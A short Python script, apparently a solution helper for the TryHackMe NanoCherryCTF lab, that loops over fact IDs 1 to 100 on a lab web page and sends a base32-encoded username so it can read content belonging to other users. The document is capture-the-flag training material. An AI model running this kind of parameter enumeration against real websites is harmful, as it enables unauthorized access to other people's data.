# with assistance from ChatGPT
# this script used on TryHackme room NanoCherryCTF https://tryhackme.com/r/room/nanocherryctf to check the page of facts from 1 to 100

import requests
import base64
import re
import argparse

def encode_username_base32(username):
    return base64.b32encode(username.encode()).decode()

def extract_fact(response_text):
    match = re.search(r'<b>(.*?)</b>', response_text)
    if match:
        return match.group(1)
    return None

def main(username):
    base_url = "http://cherryontop.thm/content.php"
    encoded_username = encode_username_base32(username)

    for facts in range(1, 101):
        params = {
            'facts': facts,
            'user': encoded_username
        }
        response = requests.get(base_url, params=params)

        if response.status_code == 200:
            fact = extract_fact(response.text)
            if fact:
                print(f"Fact {facts}: {fact}")
        else:
            print(f"Failed to fetch fact {facts}. Status code: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fetch facts from a website with base32 encoded username.")
    parser.add_argument("-u", "--username", required=True, help="Username to be encoded in base32.")
    args = parser.parse_args()

    main(args.username)

